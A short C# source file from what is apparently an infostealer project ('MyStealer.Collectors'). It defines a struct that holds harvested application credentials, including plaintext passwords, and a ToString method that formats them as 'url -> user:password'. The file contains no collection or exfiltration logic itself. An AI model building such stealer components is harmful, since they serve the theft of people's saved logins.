namespace MyStealer.Collectors
{
    internal struct CredentialEntry
    {
        public string ApplicationName { get; set; }
        public string ApplicationProfileName { get; set; }
        public string UserName { get; set; }
        public string Password { get; set; }
        public string Url { get; set; }

        public override string ToString() => $"Credential({ApplicationName} - {ApplicationProfileName}){{{Url} -> {UserName}:{Password}}}";
    }
}
